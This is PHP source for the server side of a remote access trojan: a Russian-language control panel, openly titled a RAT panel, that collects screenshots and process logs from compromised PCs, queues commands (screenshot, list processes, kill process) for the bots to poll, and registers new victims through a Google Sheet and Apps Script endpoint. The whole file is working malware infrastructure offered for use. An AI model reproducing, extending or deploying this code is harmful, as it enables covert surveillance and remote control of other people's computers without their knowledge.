<?php
header("Cache-Control: no-cache, must-revalidate");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

$csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?gid=0&single=true&output=csv";
$googleExecUrl = "https://script.google.com/macros/s/AKfycbzM-qCeDJlu8YA6b04MSBIPt2E0WjLBt2yNBQqXzrva38HnSZ2vNPt4rx1SU9DLoAZjow/exec";

// 1. ПРИЕМ СКРИНШОТОВ (Сохраняем до 3 штук на каждый IP)
if (isset($_FILES['screen']) && isset($_POST['pc_id'])) {
    $ip = $_POST['pc_id'];
    // Сдвигаем старые скрины: 2 становится 3, 1 становится 2
    if (file_exists("screen_{$ip}_2.jpg")) @rename("screen_{$ip}_2.jpg", "screen_{$ip}_3.jpg");
    if (file_exists("screen_{$ip}_1.jpg")) @rename("screen_{$ip}_1.jpg", "screen_{$ip}_2.jpg");
    
    move_uploaded_file($_FILES['screen']['tmp_name'], "screen_{$ip}_1.jpg");
    exit("ok");
}

// 2. ПРИЕМ ТЕКСТОВЫХ ЛОГОВ (Для каждого ПК свой лог)
if (isset($_POST['log']) && isset($_POST['pc_id'])) {
    $ip = $_POST['pc_id'];
    file_put_contents("log_{$ip}.txt", $_POST['log']);
    exit("ok");
}

// ОБРАБОТКА КОМАНД ДЛЯ БОТА
if (isset($_GET['get_cmd'])) { $file = "cmd_{$_GET['pc_id']}.txt"; echo file_exists($file) ? file_get_contents($file) : "none"; exit; }
if (isset($_GET['clear_cmd'])) { @unlink("cmd_{$_GET['pc_id']}.txt"); exit("ok"); }

// ОБРАБОТКА ФОРМЫ ИМЕНИ / ПЕРЕИМЕНОВАНИЯ
if (isset($_POST['rename_pc'])) {
    $targetIp = $_POST['ip'];
    $newName = urlencode($_POST['new_name']);
    @file_get_contents($googleExecUrl . "?rename=1&ip={$targetIp}&new_name={$newName}");
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}

// ОТПРАВКА КОМАНДЫ ИЗ ПАНЕЛИ
if (isset($_POST['send_cmd'])) {
    $pc_id = $_POST['pc_id'];
    $cmd = $_POST['cmd'];
    if ($cmd == 'delete' && !empty($_POST['proc_name'])) $cmd .= " " . $_POST['proc_name'];
    file_put_contents("cmd_{$pc_id}.txt", $cmd);
    header("Location: " . $_SERVER['PHP_SELF']); exit;
}

// ЧТЕНИЕ ТАБЛИЦЫ GOOGLE
$data = @file_get_contents($csvUrl);
$named_pcs = [];
$unnamed_ips = [];

if ($data !== false) {
    $rows = array_map('str_getcsv', explode("\n", $data));
    array_shift($rows);
    
    foreach ($rows as $row) {
        if (count($row) < 3) continue;
        $time = trim($row[0]); $ip = trim($row[1]); $status = trim($row[2]); $name = isset($row[3]) ? trim($row[3]) : "";
        if (empty($ip)) continue;
        
        if (empty($name)) {
            // Если имени нет, отправляем в список "Новые запросы"
            $unnamed_ips[$ip] = $time;
        } else {
            // Если имя есть, формируем личную панель ПК
            if (!isset($named_pcs[$ip])) {
                $named_pcs[$ip] = ['name' => $name, 'history' => [], 'is_online' => false];
            }
            $named_pcs[$ip]['history'][] = "[{$time}] {$status}";
            
            // Проверка на "Онлайн" (если последний пинг был меньше 15 секунд назад)
            if (strtotime($time) > (time() - 15)) {
                $named_pcs[$ip]['is_online'] = true;
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Центр Управления Устройствами</title>
    <style>
        body { background: #0f172a; color: white; font-family: system-ui, sans-serif; padding: 20px; }
        .grid { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; width: 340px; border: 1px solid #334155; position: relative; }
        .new-pc-card { background: #2d1b4e; border: 1px solid #7c3aed; }
        .btn { background: #3b82f6; color: white; border: none; padding: 8px 12px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 5px; }
        .btn-danger { background: #ef4444; }
        input[type="text"] { width: calc(100% - 16px); padding: 6px; border-radius: 6px; border: 1px solid #475569; background: #334155; color: white; margin-bottom: 8px; }
        .status-badge { padding: 4px 8px; border-radius: 20px; font-size: 12px; font-weight: bold; position: absolute; top: 20px; right: 20px; }
        .online { background: #065f46; color: #34d399; }
        .offline { background: #991b1b; color: #f87171; }
        .history { background: #020617; font-family: monospace; padding: 6px; border-radius: 6px; max-height: 80px; overflow-y: auto; font-size: 11px; color: #a7f3d0; margin-top: 10px; }
        .console { background: #020617; font-family: monospace; padding: 6px; border-radius: 6px; height: 80px; overflow-y: auto; color: #38bdf8; font-size: 11px; margin-top: 10px; }
        .screenshots { display: flex; gap: 5px; margin-top: 10px; overflow-x: auto; padding-bottom: 5px; }
        .screenshots img { width: 31%; border-radius: 4px; border: 1px solid #475569; cursor: pointer; transition: 0.2s; }
        .screenshots img:hover { transform: scale(1.05); }
    </style>
</head>
<body>

    <h1>Многопользовательская Панель RAT</h1>

    <?php if (!empty($unnamed_ips)): ?>
        <h2>⚠️ Обнаружены новые устройства! Задайте имя:</h2>
        <div class="grid">
            <?php foreach($unnamed_ips as $ip => $time): ?>
                <div class="card new-pc-card">
                    <h3>Новый ПК найден!</h3>
                    <p style="font-size:12px; color:#cbd5e1;">IP Железа: <b><?= $ip ?></b><br>Запрос: <?= $time ?></p>
                    <form method="post">
                        <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
                        <input type="text" name="new_name" placeholder="Придумайте имя (например: ПК_Админ)" required>
                        <button type="submit" name="rename_pc" class="btn" style="background:#7c3aed;">Создать личную панель</button>
                    </form>
                </div>
            <?php endforeach; ?>
        </div>
        <hr style="border-color:#334155; margin: 30px 0;">
    <?php endif; ?>

    <h2>Подключенные панели управления</h2>
    <div class="grid">
        <?php if(empty($named_pcs)): ?><p style="color:#64748b;">Зарегистрированных панелей пока нет...</p><?php endif; ?>
        
        <?php foreach($named_pcs as $ip => $info): ?>
            <div class='card'>
                <span class="status-badge <?= $info['is_online'] ? 'online' : 'offline' ?>">
                    <?= $info['is_online'] ? 'В СЕТИ' : 'ОФФЛАЙН' ?>
                </span>

                <div style="font-size: 20px; font-weight: 700; max-width: 180px; overflow: hidden;"><?= htmlspecialchars($info['name']) ?></div>
                <div style="font-size: 12px; color: #94a3b8; margin-bottom: 15px;">IP: <?= htmlspecialchars($ip) ?></div>
                
                <form method="post">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>"><input type="hidden" name="send_cmd" value="1">
                    <button type="submit" name="cmd" value="screen" class="btn">📸 Сделать скриншот</button>
                    <button type="submit" name="cmd" value="app" class="btn">📋 Снять процессы</button>
                </form>

                <form method="post" style="margin-top: 5px;">
                    <input type="hidden" name="pc_id" value="<?= htmlspecialchars($ip) ?>"><input type="hidden" name="send_cmd" value="1"><input type="hidden" name="cmd" value="delete">
                    <input type="text" name="proc_name" placeholder="Имя процесса для закрытия">
                    <button type="submit" class="btn btn-danger">❌ Завершить процесс</button>
                </form>

                <div class="console">
                    <?= file_exists("log_{$ip}.txt") ? htmlspecialchars(file_get_contents("log_{$ip}.txt")) : "Логи процессов пустые..." ?>
                </div>

                <div style="font-size:11px; color:#94a3b8; margin-top:10px;">Последние 3 скриншота (клик для скачивания):</div>
                <div class="screenshots">
                    <?php for($s=1; $s<=3; $s++): $imgFile = "screen_{$ip}_{$s}.jpg"; ?>
                        <?php if(file_exists($imgFile)): ?>
                            <img src="<?= $imgFile ?>?t=<?= time() ?>" onclick="window.open(this.src)" title="Скачать скриншот #<?= $s ?>">
                        <?php else: ?>
                            <div style="width:31%; height:50px; background:#020617; border-radius:4px; display:flex; align-items:center; justify-content:center; font-size:9px; color:#475569;">Пусто</div>
                        <?php endif; ?>
                    <?php endfor; ?>
                </div>

                <div class="history">
                    <div style="color:#64748b; font-size:10px; margin-bottom:3px;">История заходов (max 5):</div>
                    <?php foreach(array_reverse($info['history']) as $log): ?>
                        <div><?= htmlspecialchars($log) ?></div>
                    <?php endforeach; ?>
                </div>
            </div>
        <?php endforeach; ?>
    </div>

</body>
</html>
